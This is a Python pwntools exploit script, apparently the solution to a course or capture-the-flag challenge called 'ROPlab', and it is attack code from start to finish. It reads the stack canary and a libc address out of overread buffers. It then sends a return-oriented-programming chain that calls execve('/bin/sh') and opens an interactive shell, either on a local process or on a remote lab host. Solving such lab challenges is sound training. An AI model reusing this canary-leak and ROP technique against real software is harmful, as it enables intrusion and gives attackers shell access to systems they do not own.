#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

if args.REMOTE:
    p = remote('140.112.31.97', '30102')
else:
    p = process(["./lib/ld-2.29.so", "./ROPlab"], env={"LD_PRELOAD" : "./lib/libc-2.29.so"})

# pause()

libc = ELF("./lib/libc-2.29.so")

def get_canary():
    p.send(cyclic(0x19))
    p.recv(6 + 0x19)
    canary = u64(p.recv(0x7).rjust(8,'\x00'))
    p.recvline()
    return canary

def get_libc():
    p.send(cyclic(0x28))
    p.recv(32 + 0x28)
    base = u64(p.recv(0x6).ljust(8,'\x00')) - libc.sym.__libc_start_main - 235
    p.recvline()
    return base

# rop_gadget
pop_rdi = 0x26542
pop_rsi = 0x26f9e
pop_rdx = 0x12bda6
pop_rax = 0x47cf8
syscall = 0x26bd4

p.recvuntil("What is your name : ")
canary = get_canary()
p.recvuntil("Leave your message here : ")

libc.address = get_libc()
p.recvuntil("Any additional remarks? ")


payload = flat(
    cyclic(0x18),
    canary,
    cyclic(0x8),
    libc.address + pop_rdi,
    libc.search('/bin/sh').next(),
    libc.address + pop_rsi,
    0,
    libc.address + pop_rdx,
    0,
    libc.address + pop_rax,
    0x3b,
    libc.address + syscall
)

p.send(payload)
p.recvuntil("Thanks for your feedback")

p.interactive()
p.close()